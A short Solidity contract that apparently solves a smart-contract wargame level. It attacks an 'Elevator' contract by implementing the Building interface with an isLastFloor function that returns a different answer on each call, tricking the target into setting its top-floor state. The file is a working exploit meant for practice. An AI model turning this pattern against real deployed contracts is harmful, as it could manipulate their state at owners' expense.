// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./Elevator.sol";
import "./IBuilding.sol";
import "hardhat/console.sol";

contract HackElevator is Building {
    bool public flipFlop;

    Elevator public elevator;

    constructor(address _elevator) {
        flipFlop = true;
        elevator = Elevator(_elevator);
    }

    function hackElevator() public {
        elevator.goTo(0);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        console.log("isLastFloor: ", flipFlop);
        return flipFlop = !flipFlop;
    }
}
